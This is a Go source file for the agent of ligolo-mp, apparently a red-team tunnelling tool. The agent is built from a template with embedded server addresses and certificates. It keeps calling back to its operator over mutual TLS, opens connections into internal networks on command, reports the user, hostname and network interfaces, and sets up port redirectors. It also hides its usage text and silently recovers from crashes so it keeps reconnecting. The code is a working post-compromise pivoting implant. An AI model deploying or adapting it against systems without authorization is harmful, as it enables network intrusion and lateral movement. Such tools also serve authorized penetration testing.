package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"os/user"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/hashicorp/yamux"
	"github.com/ttpreport/ligolo-mp-agent/internal/neterror"
	"github.com/ttpreport/ligolo-mp-agent/internal/protocol"
	connectproxy "github.com/ttpreport/ligolo-mp-agent/internal/proxy/connect"
	"github.com/ttpreport/ligolo-mp-agent/internal/relay"
	"github.com/ttpreport/ligolo-mp-agent/internal/smartping"
	"golang.org/x/net/proxy"
)

var (
	redirectorMap   map[string]relay.Redirector
	redirectorMutex sync.Mutex
)

func main() {
	// One-time setup: these run exactly once regardless of how many times the
	// connection loop is restarted after a panic.
	timeout := 10 * time.Second
	proxy.RegisterDialerType("http", connectproxy.HttpHandler(timeout))
	proxy.RegisterDialerType("https", connectproxy.HttpsHandler(timeout, &tls.Config{
		InsecureSkipVerify: true,
	}))
	proxy.RegisterDialerType("ntlm", connectproxy.HttpHandler(timeout))

	var proxyServer = `{{ .ProxyServer }}`
	var servers = strings.Split(`{{ .Servers }}`, "\n")
	var AgentCert = []byte(`{{ .AgentCert }}`)
	var AgentKey = []byte(`{{ .AgentKey }}`)
	var CACert = []byte(`{{ .CACert }}`)
	var ignoreEnvProxy, _ = strconv.ParseBool(`{{ .IgnoreEnvProxy }}`)

	flag.Usage = func() {}
	var insecure = flag.Bool("insecure", false, "")
	var serverOverride = flag.String("server", "", "")
	flag.Parse()

	if *serverOverride != "" {
		servers = []string{*serverOverride}
	}

	redirectorMap = make(map[string]relay.Redirector)

	// Outer loop restarts the connection loop after a panic without growing the
	// call stack. Each iteration wraps run() in a panic-recovering closure so
	// that a nil-deref or other runtime panic is contained and the agent
	// reconnects cleanly instead of crashing.
	for {
		func() {
			defer func() { recover() }() //nolint:errcheck
			run(servers, proxyServer, *insecure, ignoreEnvProxy, timeout, AgentCert, AgentKey, CACert)
		}()
		time.Sleep(5 * time.Second)
	}
}

// run contains the infinite connection loop. It is a separate function so that
// the panic-recovery wrapper in main() can restart it without recursion.
func run(servers []string, proxyServer string, insecure, ignoreEnvProxy bool, timeout time.Duration, AgentCert, AgentKey, CACert []byte) {
	var conn net.Conn
	for {
		for _, server := range servers {
			host, _, err := net.SplitHostPort(server)
			if err != nil {
				continue
			}

			ca := x509.NewCertPool()
			if ok := ca.AppendCertsFromPEM(CACert); !ok {
				continue
			}

			mtlsCert, err := tls.X509KeyPair(AgentCert, AgentKey)
			if err != nil {
				continue
			}

			tlsConfig := tls.Config{
				RootCAs:            ca,
				ServerName:         host,
				Certificates:       []tls.Certificate{mtlsCert},
				InsecureSkipVerify: true,
				VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
					cert, err := x509.ParseCertificate(rawCerts[0])
					if err != nil {
						return err
					}

					options := x509.VerifyOptions{
						Roots: ca,
					}
					if options.Roots == nil {
						return errors.New("no root certificate")
					}

					if !insecure {
						if _, err := cert.Verify(options); err != nil {
							return err
						}
					}

					return nil
				},
			}

			dialer := &net.Dialer{
				Timeout: timeout,
			}

			if proxyServer != "" {
				u, err := url.Parse(proxyServer)
				if nil != err {
					continue
				}
				d, err := proxy.FromURL(u, dialer)
				if nil != err {
					continue
				}

				conn, err = d.Dial("tcp", server)
				if err != nil {
					continue
				}
			} else {
				if ignoreEnvProxy {
					conn, err = net.DialTimeout("tcp", server, timeout)
					if err != nil {
						continue
					}
				} else {
					proxyDialer := proxy.FromEnvironmentUsing(dialer)
					conn, err = proxyDialer.Dial("tcp", server)
					if err != nil {
						continue
					}
				}
			}

			connect(conn, &tlsConfig)
		}

		time.Sleep(5 * time.Second)
	}
}

func connect(conn net.Conn, config *tls.Config) error {
	tlsConn := tls.Client(conn, config)

	yamuxConf := yamux.DefaultConfig()
	yamuxConf.LogOutput = io.Discard
	yamuxConn, err := yamux.Server(tlsConn, yamuxConf)
	if err != nil {
		return err
	}

	for {
		conn, err := yamuxConn.Accept()
		if err != nil {
			return err
		}
		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	decoder := protocol.NewDecoder(conn)
	if err := decoder.Decode(); err != nil {
		return
	}

	e := decoder.Envelope.Payload
	switch decoder.Envelope.Type {
	case protocol.MessageConnectRequest:
		connRequest := e.(protocol.ConnectRequestPacket)
		encoder := protocol.NewEncoder(conn)
		var network string
		if connRequest.Transport == protocol.TransportTCP {
			network = "tcp"
		} else {
			network = "udp"
		}
		if connRequest.Net == protocol.Networkv4 {
			network += "4"
		} else {
			network += "6"
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		var d net.Dialer
		targetConn, err := d.DialContext(ctx, network, fmt.Sprintf("%s:%d", connRequest.Address, connRequest.Port))
		var connectPacket protocol.ConnectResponsePacket
		if err != nil {
			var serr syscall.Errno
			if errors.As(err, &serr) {
				// Magic trick! If the error syscall indicate that the system responded, send back a RST packet!
				if neterror.HostResponded(serr) {
					connectPacket.Reset = true
				}
			}

			connectPacket.Established = false
		} else {
			connectPacket.Established = true
		}

		if err = encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageConnectResponse,
			Payload: connectPacket,
		}); err != nil {
			return
		}

		if connectPacket.Established {
			relay.StartRelay(conn, targetConn)
		}
	case protocol.MessageHostPingRequest:
		pingRequest := e.(protocol.HostPingRequestPacket)
		encoder := protocol.NewEncoder(conn)

		pingResponse := protocol.HostPingResponsePacket{Alive: smartping.TryResolve(pingRequest.Address)}

		encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageHostPingResponse,
			Payload: pingResponse,
		})
	case protocol.MessageInfoRequest:
		var username string
		encoder := protocol.NewEncoder(conn)
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "UNKNOWN"
		}

		userinfo, err := user.Current()
		if err != nil {
			username = "Unknown"
		} else {
			username = userinfo.Username
		}

		netifaces, err := net.Interfaces()
		if err != nil {
			return
		}

		var nonloopbackIfaces []net.Interface
		for _, iface := range netifaces {
			if iface.Flags&net.FlagLoopback == 0 {
				nonloopbackIfaces = append(nonloopbackIfaces, iface)
			}
		}

		redirectorMutex.Lock()
		redirectorSnapshot := protocol.NewRedirectorInterface(redirectorMap)
		redirectorMutex.Unlock()

		infoResponse := protocol.InfoReplyPacket{
			Name:        fmt.Sprintf("%s@%s", username, hostname),
			Hostname:    hostname,
			Interfaces:  protocol.NewNetInterfaces(nonloopbackIfaces),
			Redirectors: redirectorSnapshot,
		}

		encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageInfoReply,
			Payload: infoResponse,
		})
	case protocol.MessageRedirectorCloseRequest:
		closeRequest := e.(protocol.RedirectorCloseRequestPacket)
		encoder := protocol.NewEncoder(conn)

		redirectorMutex.Lock()
		lis, ok := redirectorMap[closeRequest.ID]
		delete(redirectorMap, closeRequest.ID)
		redirectorMutex.Unlock()

		var err error
		if ok {
			err = lis.Close()
		}

		redirectorResponse := protocol.RedirectorCloseResponsePacket{
			Err: err != nil,
		}
		if err != nil {
			redirectorResponse.ErrString = err.Error()
		}

		encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageRedirectorCloseResponse,
			Payload: redirectorResponse,
		})

	case protocol.MessageRedirectorRequest:
		redirectorRequest := e.(protocol.RedirectorRequestPacket)
		encoder := protocol.NewEncoder(conn)

		var redirectorResponse protocol.RedirectorResponsePacket
		redirector, err := relay.NewLRedirector(redirectorRequest.ID, redirectorRequest.Network, redirectorRequest.From, redirectorRequest.To)
		if err != nil {
			redirectorResponse = protocol.RedirectorResponsePacket{
				ID:        redirector.ID,
				Err:       true,
				ErrString: err.Error(),
			}
		} else {
			redirectorMutex.Lock()
			_, exists := redirectorMap[redirector.ID]
			if !exists {
				redirectorMap[redirector.ID] = redirector
			}
			redirectorMutex.Unlock()

			if exists {
				redirectorResponse = protocol.RedirectorResponsePacket{
					ID:        redirector.ID,
					Err:       true,
					ErrString: "redirector already exists",
				}
			} else {
				redirectorResponse = protocol.RedirectorResponsePacket{
					ID:        redirector.ID,
					Err:       false,
					ErrString: "",
				}
				go redirector.ListenAndRelay()
			}
		}

		encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageRedirectorResponse,
			Payload: redirectorResponse,
		})
	case protocol.MessageDisconnectRequest:
		encoder := protocol.NewEncoder(conn)
		encoder.Encode(protocol.Envelope{
			Type:    protocol.MessageRedirectorResponse,
			Payload: protocol.DisconnectResponsePacket{},
		})
		os.Exit(0)
	}
}
